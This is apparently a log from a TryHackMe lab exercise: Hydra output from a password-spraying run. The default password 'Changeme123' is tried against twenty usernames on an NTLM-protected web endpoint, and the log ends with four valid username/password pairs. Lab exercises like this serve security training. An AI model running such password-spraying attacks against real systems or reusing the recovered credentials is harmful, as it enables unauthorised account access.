Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-18 08:49:11
[DATA] max 15 tasks per 1 server, overall 15 tasks, 20 login tries (l:20/p:1), ~2 tries per task
[DATA] attacking http-get://ntlmauth.za.tryhackme.com:80/
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "anthony.reynolds" - pass "Changeme123" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "samantha.thompson" - pass "Changeme123" - 2 of 20 [child 1] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dawn.turner" - pass "Changeme123" - 3 of 20 [child 2] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "frances.chapman" - pass "Changeme123" - 4 of 20 [child 3] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "henry.taylor" - pass "Changeme123" - 5 of 20 [child 4] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "jennifer.wood" - pass "Changeme123" - 6 of 20 [child 5] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "hollie.powell" - pass "Changeme123" - 7 of 20 [child 6] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "louise.talbot" - pass "Changeme123" - 8 of 20 [child 7] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "heather.smith" - pass "Changeme123" - 9 of 20 [child 8] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dominic.elliott" - pass "Changeme123" - 10 of 20 [child 9] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "gordon.stevens" - pass "Changeme123" - 11 of 20 [child 10] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "alan.jones" - pass "Changeme123" - 12 of 20 [child 11] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "frank.fletcher" - pass "Changeme123" - 13 of 20 [child 12] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "maria.sheppard" - pass "Changeme123" - 14 of 20 [child 13] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "sophie.blackburn" - pass "Changeme123" - 15 of 20 [child 14] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "dawn.hughes" - pass "Changeme123" - 16 of 20 [child 0] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "henry.black" - pass "Changeme123" - 17 of 20 [child 1] (0/0)
[80][http-get] host: ntlmauth.za.tryhackme.com   login: hollie.powell   password: Changeme123
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "joanne.davies" - pass "Changeme123" - 18 of 20 [child 3] (0/0)
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "mark.oconnor" - pass "Changeme123" - 19 of 20 [child 6] (0/0)
[80][http-get] host: ntlmauth.za.tryhackme.com   login: gordon.stevens   password: Changeme123
[ATTEMPT] target ntlmauth.za.tryhackme.com - login "georgina.edwards" - pass "Changeme123" - 20 of 20 [child 2] (0/0)
[80][http-get] host: ntlmauth.za.tryhackme.com   login: heather.smith   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: georgina.edwards   password: Changeme123
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-18 08:49:13
